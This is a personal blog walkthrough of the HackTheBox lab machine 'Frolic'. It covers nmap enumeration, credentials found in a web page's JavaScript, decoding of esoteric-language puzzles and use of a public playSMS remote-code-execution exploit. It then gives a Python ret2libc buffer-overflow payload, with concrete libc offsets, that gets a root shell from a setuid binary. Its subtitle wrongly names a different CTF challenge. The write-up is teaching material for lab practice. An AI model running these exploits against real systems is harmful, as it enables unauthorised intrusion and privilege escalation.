<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="/css/post.css">
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/scroll.css">
  <link rel="stylesheet" href="/css/typewriter.css">
  <link rel="stylesheet" href="/fontawesome/css/all.min.css">
  <title>My pentest notes</title>
</head>
<body>


<div class="header">
  <div>
    <h3><span class="typewriter">My pentest notes</span></h3>
  </div>
</div>

<div class="nav">
  <ul class="text-source">
    <li> <a href="/">HOME</a> </li>
    <li> <a href="\list">POSTS</a> </li>
  </ul>
</div>


<div class="row">
  <div class="leftcolumn">
    <div class="card">
  <h2 class="text-source">About Me</h2>
  <ul class="list-none">
    <li><i class="fas fa-user mb-08"></i> DanP</li>
    <li><i class="fas fa-map-marker-alt mb-08"></i> Brazil</li>
    <li><i class="fas fa-envelope mb-08"></i> 
    	<a class="decoration-none text-white" target="_blank" href="mailto:soaresdaniel487@gmail.com"> E-mail </a> 
    </li>
    <li><i class="fab fa-github"></i> <a class="decoration-none text-white" href="https://github.com/D4nPs" target="_blank">Github</a> </li>
  </ul>
</div>

  </div>

  <div class="rightcolumn">
    <div class="card box-content">
    	
      <h2 class="text-source text-blue"> Frolic ‚Äî HacktheBox Walkthrough </h2>
<h5> Hey guys! This post I‚Äôll be showing you how I solved the Hello World Challenge from TAMUCTF2019. </h5>
<h5> Mar, 23 2019 </h5>


      <p class="text-center"><img src="/img/jekyll/6/desc.png" alt="image example" class="img-responsive" /></p>

<p>Hey guys! In this post I will be showing how I solved the machine ‚ÄúFrolic‚Äù from HackTheBox.</p>

<p>It was a pretty ctf like machine, and well‚Ä¶ I love ctfs, so that turned out to be really fun, specially priv esc part.</p>

<p>I‚Äôll be posting the links where I got some references on how to proceed when I got a bit stucked.</p>

<p class="text-center"><img src="/img/jekyll/1/ratf.png" alt="image example" class="img-responsive" /></p>

<p>Let‚Äôs start with our standard nmap scan:</p>

<figure class="highlight"><pre><code class="language-cmd" data-lang="cmd">nmap -sV -sC -v 10.10.10.111
# Nmap 7.60 scan initiated Sat Mar 16 08:43:07 2019 as: nmap -sV -sC -v -o frolic 10.10.10.111
Nmap scan report for 10.10.10.111
Host is up (0.23s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (EdDSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
| nbstat: NetBIOS name: FROLIC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   FROLIC&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   FROLIC&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   FROLIC&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2019-03-16T17:13:43+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-03-16 08:43:43
|_  start_date: 1600-12-31 21:26:00
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 16 08:43:49 2019 -- 1 IP address (1 host up) scanned in 42.33 seconds</code></pre></figure>

<p>We can spot four different services running on this box, three of them are useless for us, so let‚Äôs focus on the service running on port 9999, a web service.</p>

<p class="text-center"><img src="/img/jekyll/6/example1.png" alt="image example" class="img-responsive" /></p>

<p>We are presented with the default nginx page, brute forcing some directories we find the /admin page.</p>

<p class="text-center"><img src="/img/jekyll/6/example2.png" alt="image example" class="img-responsive" /></p>

<p>A log in page, we must find some credentials. Looking in the source code of the js file, we find this.</p>

<p class="text-center"><img src="/img/jekyll/6/code1.png" alt="image example" class="img-responsive" /></p>

<p>Great, we got our user and pass. Let‚Äôs check the success.html page.</p>

<figure class="highlight"><pre><code class="language-cmd" data-lang="cmd">user = admin
password = superduperlooperpassword_lol</code></pre></figure>

<p class="text-center"><img src="/img/jekyll/6/example3.png" alt="image example" class="img-responsive" /></p>

<p>What the heck is this?? üòê</p>

<p>After some searching on esoteric languages I found this ‚ÄúOok!?‚Äù Programming language and a website that could decode it.</p>

<p class="text-center"><img src="/img/jekyll/6/example4.png" alt="image example" class="img-responsive" /></p>

<p>It tells us to check another directory so off we go.</p>

<p>Reaching this dir we find this</p>

<figure class="highlight"><pre><code class="language-cmd" data-lang="cmd">UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA</code></pre></figure>

<p>It appears to be a base64 encoded message, so when I decoded it show a PK‚Ä¶ among other random bytes.So this is a zip file.</p>

<p>When I tried the unzip It asks for a password. I just brute forced it and the password found as was ‚Äúpassword‚Äù, how cool xd.</p>

<p>Moving on, the file inside called ‚Äúindex.php‚Äù shows:</p>

<figure class="highlight"><pre><code class="language-cmd" data-lang="cmd">4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a</code></pre></figure>

<p>obviously some hex code</p>

<p>decoding it we get another b64 and after that we find this</p>

<figure class="highlight"><pre><code class="language-cmd" data-lang="cmd">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +.--- --.++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.-- ----- .&lt;+++ +[-&gt;+ +++&lt;] &gt;+++. &lt;+++[ -&gt;---&lt;]&gt;-- .&lt;+++ [-&gt;++ +&lt;]&gt;+ .---. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt;++..&lt;</code></pre></figure>

<p>That‚Äôs clearly a brain f*ck code. Let‚Äôs see what is says</p>

<p class="text-center"><img src="/img/jekyll/6/example5.png" alt="image example" class="img-responsive" /></p>

<p>Cool, we got something that looks like a password, but password for what? üòø</p>

<p>Let‚Äôs go back to our enumeration phase and start over, we must have missed something.</p>

<p class="text-center"><img src="/img/jekyll/6/example6.png" alt="image example" class="img-responsive" /></p>

<figure class="highlight"><pre><code class="language-cmd" data-lang="cmd">The backup gives us some creds, but it is a rabbit hole :(
the test page gives us php info. nothing useful.
dev page a 403 error.</code></pre></figure>

<p>Awesome, after some more enumeration we got nothing xd</p>

<p>Let‚Äôs keep trying</p>

<p>Looking into dev/ folder we have another backup.</p>

<p class="text-center"><img src="/img/jekyll/6/code2.png" alt="image example" class="img-responsive" /></p>

<p>And there we have a /playsms folder, finally something to use ours creds on.</p>

<p class="text-center"><img src="/img/jekyll/6/example7.png" alt="image example" class="img-responsive" /></p>

<p>To get our reverse shell I found this great exploit on github.</p>

<p class="text-center"><img src="/img/jekyll/6/example8.png" alt="image example" class="img-responsive" /></p>

<p class="text-center"><a href="https://github.com/jasperla/CVE-2017-9101" class="btn btn-blue">CLICK TO ACCESS GITHUB- jasperla</a></p>

<p class="text-center"><img src="/img/jekyll/6/code3.png" alt="image example" class="img-responsive" /></p>

<p>Sweet! We got rce.</p>

<p>Since this is a pretty bad shell I got a new one using php and netcat. But I‚Äôll just skip this part xd</p>

<p>After getting a better shell, just went to the user home dir and found user.txt xd.</p>

<p class="text-center"><img src="/img/jekyll/6/code4.png" alt="image example" class="img-responsive" /></p>

<p>Now the root part!</p>

<p>Searching the home directory of ayush, we find a .binary dir.</p>

<p class="text-center"><img src="/img/jekyll/6/code5.png" alt="image example" class="img-responsive" /></p>

<p>We find a ‚Äúrop‚Äù binary. Notice its permissions, any user can execute it and do it as root because the sticky bit is set.So if we invoke a shell using this binary we get root, let‚Äôs try.</p>

<p><i>In this post I‚Äôll not be explaining how a buffer overflow occurs or how to exploit it in details. I‚Äôm just gonna explain some thoughts that I had during the exploitation.</i></p>

<p>The binary simply runs with an argument the we pass and spits it back out for us, nothing interesting, however if we send a lot of bytes to it, it breaks.</p>

<p class="text-center"><img src="/img/jekyll/6/code6.png" alt="image example" class="img-responsive" /></p>

<p>Cool, we can overwrite EIP but return where?</p>

<p>The name of the binary already gives us a pretty good hint on what to do, let‚Äôs use a technique called ‚ÄúReturn to libc‚Äù that is a type of ROP.</p>

<p><i>You can learn more what is ROP here</i></p>

<p>If you wanna know more about Ret2libc those following links helped me a lot.</p>

<p class="text-center">
<iframe width="560" height="315" src="https://www.youtube.com/embed/m17mV24TgwY" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

<p class="text-center"><img src="/img/jekyll/6/example9.png" alt="image example" class="img-responsive" /></p>

<p class="text-center"><a href="https://galvanizedsecurity.com/ret2libc/" class="btn btn-blue">CLICK TO ACCESS RET2LIBC</a></p>

<p>So basically we need 5 things to succeed.</p>
<ol>
	<li>The offset to overwrite EIP</li>
	<li>libc base address</li>
	<li>system call offset</li>
	<li>exit call offset (optional)</li>
	<li>string ‚Äú/bin/bash‚Äù</li>
</ol>
<p>Lets do one by one:</p>

<p>To get the offset to overwrite eip I used that pretty standard technique with pattern_create, and got a number of 52.</p>

<p>To get libc base address we use ldd and grep for libc.</p>

<p class="text-center"><img src="/img/jekyll/6/code7.png" alt="image example" class="img-responsive" /></p>

<p><i>Note: ASLR is turned off in this box, so lucky for us we don‚Äôt need to bypass it.</i></p>

<p>Now we need system call offset for libc we do</p>

<figure class="highlight"><pre><code class="language-cmd" data-lang="cmd">readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system</code></pre></figure>

<p class="text-center"><img src="/img/jekyll/6/code8.png" alt="image example" class="img-responsive" /></p>

<p>Same thing for exit function.</p>

<figure class="highlight"><pre><code class="language-cmd" data-lang="cmd">readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit</code></pre></figure>

<p class="text-center"><img src="/img/jekyll/6/code9.png" alt="image example" class="img-responsive" /></p>

<p>Now the last thing we need is to find ‚Äú/bin/sh‚Äù string, we do.</p>

<figure class="highlight"><pre><code class="language-cmd" data-lang="cmd">strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</code></pre></figure>

<p class="text-center"><img src="/img/jekyll/6/code10.png" alt="image example" class="img-responsive" /></p>

<p>Sweet, we got everything we need. Let‚Äôs chain all together with some python code.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">import</span> <span class="k">struct</span>

<span class="n">offset</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">52</span>

<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="mh">0xb7e19000</span>
<span class="n">system_base_addr</span> <span class="o">=</span> <span class="mh">0x0003ada0</span>
<span class="n">exit_base_addr</span> <span class="o">=</span> <span class="mh">0x0002e9d0</span>
<span class="n">base_sh</span> <span class="o">=</span> <span class="mh">0x0015ba0b</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="k">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">system_base_addr</span><span class="p">)</span>
<span class="n">exit_addr</span> <span class="o">=</span> <span class="k">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">exit_base_addr</span><span class="p">)</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="k">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">base_sh</span><span class="p">)</span>

<span class="n">print</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">system_addr</span> <span class="o">+</span> <span class="n">exit_addr</span> <span class="o">+</span> <span class="n">bin_sh</span></code></pre></figure>

<p>So running this:</p>

<p class="text-center"><img src="/img/jekyll/6/code11.png" alt="image example" class="img-responsive" /></p>

<p>we get our root shell!</p>

<p class="text-center"><img src="/img/jekyll/6/code12.png" alt="image example" class="img-responsive" /></p>

<p>Hope you guys enjoyed it!</p>

<p>by me</p>


      <div style="margin-top: 50px">
      <div id="share-bar">

    <h5 class="text-center">Share this:</h5>

    <div class="share-buttons text-center">
        <a style="text-decoration: none;" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/Frolic-hackthebox-walkthrough/"
            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
            title="Share on Facebook" >
            <i class="fab fa-facebook share-button text-white"></i>
        </a>

        <a style="text-decoration: none;" href="https://twitter.com/intent/tweet?text=Frolic ‚Äî HacktheBox Walkthrough&url=http://localhost:4000/Frolic-hackthebox-walkthrough/"
            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
            title="Share on Twitter" >
            <i class="fab fa-twitter share-button"></i>
        </a>

        <a style="text-decoration: none;" href="http://www.reddit.com/submit?url=http://localhost:4000/Frolic-hackthebox-walkthrough/"
            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;"
            title="Share on Reddit" >
            <i class="fab fa-reddit-alien share-button"></i>
        </a>

        <a style="text-decoration: none;" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/Frolic-hackthebox-walkthrough/&title=Frolic ‚Äî HacktheBox Walkthrough&summary=Hey guys! This post I‚Äôll be showing you how I solved the Hello World Challenge from TAMUCTF2019.&source=My pentest notes"
            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
            title="Share on LinkedIn" >
            <i class="fab fa-linkedin share-button"></i>
        </a>

        <a style="text-decoration: none;" href="mailto:?subject=Frolic ‚Äî HacktheBox Walkthrough&amp;body=Check out this site http://localhost:4000/Frolic-hackthebox-walkthrough/"
            title="Share via Email" >
            <i class="fa fa-envelope share-button"></i>
        </a>
    </div>

</div>
      </div>
      
    </div>
  </div>

</div>

<div class="footer">
  <h5>¬© Copyright 2020 - All Rights Reserved - DanP</h5>
</div>


</body>
</html>
